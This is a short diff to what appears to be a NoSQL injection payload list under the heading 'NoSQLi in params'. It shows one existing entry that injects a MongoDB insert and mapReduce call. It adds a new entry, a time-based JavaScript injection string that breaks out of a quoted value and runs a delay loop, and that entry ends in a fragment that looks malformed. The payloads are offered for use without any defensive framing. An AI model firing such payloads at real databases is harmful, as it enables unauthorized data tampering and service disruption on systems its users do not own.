@@ -71,3 +71,6 @@ NoSQLi in params:
 15. {
   "text": "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1"
 }
+16. {
+  "text": "1\';var d=new Date();do{var cd=new Date();}while(cd-d<1);var>"
+}
